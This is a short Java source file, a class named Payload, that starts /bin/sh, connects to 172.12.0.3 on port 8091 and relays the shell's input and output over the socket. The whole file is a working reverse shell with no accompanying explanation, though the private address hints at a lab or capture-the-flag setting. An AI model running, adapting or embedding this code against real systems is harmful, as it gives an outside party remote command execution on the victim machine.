import java.util.*;
import java.lang.*;
import java.io.*;
import java.net.*;
public class Payload{

	Payload(){
		try{
			System.out.println("Running");
			String host="172.12.0.3";
			int port=8091;
			String cmd="/bin/sh";
			Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
			Socket s=new Socket(host,port);
			InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
			OutputStream po=p.getOutputStream(),so=s.getOutputStream();
			while(!s.isClosed()){
				while(pi.available()>0)
					so.write(pi.read());
				while(pe.available()>0)
					so.write(pe.read());
				while(si.available()>0)
					po.write(si.read());
				so.flush();
				po.flush();
				Thread.sleep(50);
				try {
					p.exitValue();
					break;
				}catch (Exception e){}
			};
			p.destroy();
			s.close();
		}
		catch(Exception exception){
			System.out.println(exception.getMessage());
		}
	}


	public static void main(String[] args){	
		System.out.println("Started");
		new Payload();
	}

}
